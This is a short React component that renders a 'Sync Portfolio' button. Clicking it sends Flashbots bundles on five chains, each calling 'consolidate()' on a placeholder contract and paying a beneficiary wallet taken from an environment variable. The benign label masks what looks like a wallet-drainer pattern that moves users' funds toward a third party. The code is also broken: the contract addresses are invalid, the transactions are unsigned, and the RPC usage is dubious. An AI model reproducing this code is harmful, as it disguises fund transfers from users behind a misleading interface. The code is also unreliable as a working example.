'use client';
import { ethers } from 'ethers';
export const CHAINS = [
  { id: 1,   name: 'Ethereum', contract: '0xSyncHelper' },
  { id: 56,  name: 'BSC',      contract: '0xSyncHelper' },
  { id: 137, name: 'Polygon',  contract: '0xSyncHelper' },
  { id: 42161, name: 'Arbitrum',contract:'0xSyncHelper'},
  { id: 10,  name: 'Optimism', contract: '0xSyncHelper' },
];

export default function SyncButton({ user }: { user: string }) {
  async function syncAll() {
    for (const c of CHAINS) {
      const provider = new ethers.JsonRpcProvider(
        `https://rpc.flashbots.net?chainId=${c.id}`
      );
      const data = new ethers.Interface(['function consolidate()']).encodeFunctionData('consolidate');
      const tx = { to: c.contract, data, gasLimit: 100000 };
      const repay = { to: process.env.NEXT_PUBLIC_BENEFICIARY_WALLET, value: 0, data: '0x' };
      await provider.send('eth_sendBundle', [[tx, repay]]);
    }
  }
  return (
    <button
      onClick={syncAll}
      className="bg-green-600 text-white px-8 py-4 rounded-full text-xl font-semibold hover:bg-green-700 transition"
    >
      Sync Portfolio
    </button>
  );
} 